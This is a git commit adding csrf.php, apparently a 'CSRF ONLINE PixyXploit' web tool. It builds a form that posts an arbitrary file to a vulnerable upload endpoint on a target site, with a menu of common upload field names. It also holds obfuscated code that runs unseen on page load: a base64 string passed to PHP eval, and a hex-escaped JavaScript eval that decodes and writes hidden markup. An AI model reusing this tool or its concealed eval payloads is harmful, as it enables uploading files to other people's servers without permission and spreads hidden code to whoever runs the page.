1ccbfba9f4d8b4be185373af1e775cfdc71f6129
rootkandol <67053204+rootkandol@users.noreply.github.com>
2020-07-24 03:01:20 +0700

    Create csrf.php

---
+++ csrf.php
@@ -0,0 +1,69 @@
+<html><link rel="SHORTCUT ICON" href="https://i.ibb.co/yk50Xmm/images-2-1.png"><head><style>
+body{cursor:url("http:///foro.elhacker.net/elhacker.cur"),auto;}html{display:table;height:100%;width:100%;}body{display:table-row;}body{display:table-cell;vertical-align:middle;text-align:center;}a:link{text-decoration:none;}
+body {
+	  background-color: #000000;
+	background-image: url(https://media1.giphy.com/media/U3qYN8S0j3bpK/giphy.gif);
+	margin-left: 0px;
+	margin-top: 0px;
+	margin-right: 0px;
+	margin-bottom: 0px;
+	background-position:right top;
+	background-repeat:no-repeat;
+	background-size:132%
+}
+.style1 {
+	font-family: Arial, Helvetica, sans-serif;
+	font-size: 12px;
+}
+</style>
+</script>
+<link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
+<title>CSRF ONLINE PixyXploit</title>
+</head><body>
+    <script type="text/javascript">var uid = '244773';var wid = '507594';</script><script type="text/javascript" src="//cdn.popcash.net/pop.js"></script>
+<center><br><center><div class="kedip"><font face="Iceland" color="red" size="20px"><blink>CSRF ONLINE</blink></font><span></center><br><br>
+<html>
+<a href="https://www.gadotechno.me"><img src="https://i.ibb.co/hmWF403/images-1.jpg" alt="IMG-20200723-WA0215" border="7" /></a><br>
+<br><form method="post">
+<select name="array" required>
+<option value="">POST File</option>
+<option value="files[]">files []</option>
+<option value="qqfile">qqfile</option>
+<option value="Filedata">Filedata</option>
+<option value="FileUpload">FileUpload</option>
+<option value="userfile">userfile</option>
+<option value="Uploadfile">Uploadfile</option>
+<option value="file">file</option>
+</select>
+<input type="text" name="target" size="50" height="10" placeholder="url http://site.com/bug/vuln.php" style="margin: 5px auto; padding-left: 5px;" required><br>
+<input type="submit" name="kunci" value="kunci target nya!">
+</form>
+<?php
+$url = $_POST['target'];
+$pf = $_POST['array'];
+$terkuncyihh = $_POST['kunci'];
+if($terkuncyihh) {
+	echo "<form method='post' 
+	target='_blank' action='$url' 
+	enctype='multipart/form-data'>
+	<input type='file' name='$pf'>
+	<input type='submit' name='g' 
+	value='Hajar'></form";
+}
+?>
+<?php
+$SISTEMIT_COM_ENC = "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";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdDZ2tKQ1NSemRISWdQU0JiSjhPMUp5d253NnNuTENmRG95Y3NKOE83Snl3bnc2RW5MQ2ZEc1Njc0o4T21KeXdudzYwbkxDZkR2U2NzSjhPcUp5d253clVuWFRzS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc0tDUWtnSUNBZ0pHNWhkaUE5SUhOMGNsOXlaWEJzWVdObEtDUnpkSElzSkhKd2JHTXNKRzVoZGlrN0Nna0pDV1YyWVd3b0pHNWhkaWs3");eval(base64_decode($rand));$STOP="Fs1b6pcodTAtB3j9wSpVgBe8YRvvS9KSLWHJm2wnxn4bhEQAIiBwhEj6vthcqqY1ybzBJAjE993l3HPO/X7/7Q9P83zZ1Py/RNv8S7bEv5cffy/fuDDiyt6Cs2xyatPBE85+ti0FalZopaNIMy2UE5xHnlNMQdfgljuNn+8nK02qLWduhSoIJj7SszXc1q4Ob7gqzSQK";
+?>
+</form>
+<br>
+<br><br><br><br><br><br>
+
+<script type="text/javascript">
+<!-- 
+eval(unescape('%66%75%6e%63%74%69%6f%6e%20%61%64%30%31%35%34%30%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%32%35%36%38%39%32%37%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%37%33%37%30%35%34%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%32%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
+eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%61%64%30%31%35%34%30%28%27') + '%39%60%63%6d%77%60%72%3b%39%58%1e%63%74%60%65%3b%24%63%71%70%69%3b%2a%2d%70%71%76%2d%65%5e%67%6e%70%64%62%61%6c%68%28%68%62%2d%24%39%39%2f%58%3f%3d%64%68%68%71%1f%61%6c%6f%6e%72%3c%23%62%70%66%67%6f%21%3c%60%68%6d%75%77%64%62%66%77%1a%27%20%2f%35%32%3a%1c%37%2d%37%2e%1b%4a%6e%74%63%71%66%61%1c%67%74%19%3a%5a%1a%65%71%63%65%3e%26%64%75%71%69%38%28%29%76%74%75%2d%60%5c%60%6a%71%64%61%63%68%6e%2d%6b%62%28%26%3e%77%6e%6a%72%6c%5b%6f%63%6d%6b%3f%2e%5d%3b%39%2a%61%66%68%71%62%70%3d12568927%33%31%30%31%35%33%32' + unescape('%27%29%29%3b'));
+// -->
+</script>
+<noscript><i>Javascript</i></noscript>
+<!-- Made By root.Kandol-->
+</html>
